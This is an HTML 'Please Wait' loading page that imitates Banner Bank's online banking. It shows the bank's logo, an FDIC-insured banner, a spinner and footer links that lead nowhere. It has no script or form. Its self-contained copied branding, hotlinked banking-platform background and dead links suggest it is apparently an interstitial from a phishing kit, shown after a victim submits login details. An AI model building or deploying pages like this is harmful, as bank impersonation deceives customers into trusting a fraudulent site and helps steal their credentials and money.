<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Please Wait</title>
    <link rel="icon" type="image/png" href="images/BANR-icon.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: url('https://cdn1.onlineaccess1.com/cdn/depot/3388/2368/cb6a8356fe8f8dbad2964b1ace778bfd/assets/images/desktop-background-q2-2d84adb4a94fe345760ff47cbb997f6e.png') no-repeat center center fixed;
            background-size: cover;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: sans-serif;
        }
        .main-container {
            width: 650px;
        }
        .fig-container {
            padding: 10px 0;
            display: flex;
            flex-direction: row;
            align-items: center;
            font-family: sans-serif;
            font-weight: 400;
            font-size: 12.8px;
            line-height: 1;
            min-height: 1rem;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        .fig-container img {
            max-height: 40px;
            width: auto;
            flex-shrink: 0;
        }
        .fidc_writing {
            margin-left: 10px;
            font-style: italic;
            color: white;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
        }
        .login-container {
            width: 100%;
            border-radius: 5px;
            overflow: hidden;
        }
        .image-section {
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0051ba;
        }
        .imgg {
            height: 150px;
            width: auto;
        }
        .wait-section {
            background-color: #fff;
            padding: 80px 10%;
            text-align: center;
            min-height: 300px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #e0e0e0;
            border-top: 5px solid #fdd835;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .wait-title {
            font-family: sans-serif;
            font-size: 24px;
            font-weight: bold;
            color: #0051ba;
            margin-bottom: 10px;
        }
        .wait-message {
            font-family: sans-serif;
            font-size: 16px;
            color: #666;
        }
        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0% { content: ''; }
            25% { content: '.'; }
            50% { content: '..'; }
            75% { content: '...'; }
            100% { content: ''; }
        }
        .footer-section {
            background-color: #0061b0;
            padding: 15px 0;
            text-align: center;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .footer-section a {
            color: white;
            text-decoration: none;
            font-size: 13px;
            border-right: 1px solid white;
            padding: 0 8px;
            font-family: sans-serif;
        }
        .footer-section a:last-child {
            border-right: none;
        }
        @media screen and (max-width: 600px) {
            body {
                padding: 40px 20px;
            }
            .main-container {
                width: 100%;
                margin: 0 auto;
            }
            .fig-container {
                flex-direction: row;
                align-items: center;
                padding: 10px 0;
                flex-wrap: nowrap;
            }
            .fig-container img {
                max-height: 35px;
                width: auto;
                flex-shrink: 0;
            }
            .fidc_writing {
                margin-left: 8px;
                font-size: 11px;
                font-style: italic;
                line-height: 1.3;
                word-break: break-word;
                color: white;
                text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
            }
            .image-section {
                justify-content: center;
                align-items: center;
            }
            .imgg {
                height: 60px;
            }
            .wait-section {
                padding: 50px 20px;
                min-height: 200px;
            }
            .spinner {
                width: 40px;
                height: 40px;
                border-width: 4px;
                margin-bottom: 20px;
            }
            .wait-title {
                font-size: 20px;
            }
            .wait-message {
                font-size: 14px;
            }
            .footer-section {
                gap: 10px;
                padding: 10px 0;
            }
            .footer-section a {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <section class="main-container">
        <!-- FDIC Container - No white frame -->
        <div class="fig-container">
            <img src="images/FDIC.jpeg" alt="FDIC Logo">
            <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
        </div>
        <div class="login-container">
            <div class="image-section">
                <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
            </div>
            <div class="wait-section">
                <div class="spinner"></div>
                <div class="wait-title">Please Wait</div>
                <div class="wait-message">Processing your request<span class="dots"></span></div>
            </div>
            <div class="footer-section">
                <a href="#">Locations</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Forgot Password</a>
                <a href="#">Unlock/Forgot Login ID</a>
                <a href="#">Enroll</a>
            </div>
        </div>
    </section>
</body>
</html>
